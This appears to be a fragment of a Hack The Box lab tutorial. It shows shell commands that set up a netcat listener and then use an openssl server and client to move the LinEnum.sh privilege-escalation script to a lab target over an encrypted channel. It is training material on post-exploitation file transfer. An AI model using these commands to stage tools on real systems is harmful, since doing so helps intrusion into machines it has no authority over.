...
```shell-session
JackTheWizard@htb[/htb]$ sudo nc -lvnp 8000
...
```shell-session
JackTheWizard@htb[/htb]$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
...
```shell-session
JackTheWizard@htb[/htb]$ openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```
...
```shell-session
JackTheWizard@htb[/htb]$ openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```
